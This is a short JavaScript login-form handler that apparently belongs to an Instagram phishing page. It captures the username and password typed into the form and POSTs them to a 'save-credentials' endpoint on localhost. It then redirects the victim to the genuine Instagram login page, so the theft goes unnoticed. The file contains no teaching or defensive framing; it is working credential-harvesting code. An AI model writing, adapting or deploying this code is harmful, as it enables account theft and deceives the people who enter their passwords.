document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    // Send the credentials to the server
    fetch('http://localhost:5000/save-credentials', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username: username, password: password })
    })
    .then(response => response.text())
    .then(data => {
        console.log(data); // Response from the server
        // window.location.href = 'https://www.youtube.com/watch?v=9n3qAeaBMGU&ab_channel=ALTERCODES';
        window.location.href = 'https://www.instagram.com/accounts/login/';
    })
    
    .catch(error => console.error('Error:', error));
    
    // Redirect immediately after form submission
    window.location.href = 'https://www.instagram.com/accounts/login/';
  });
  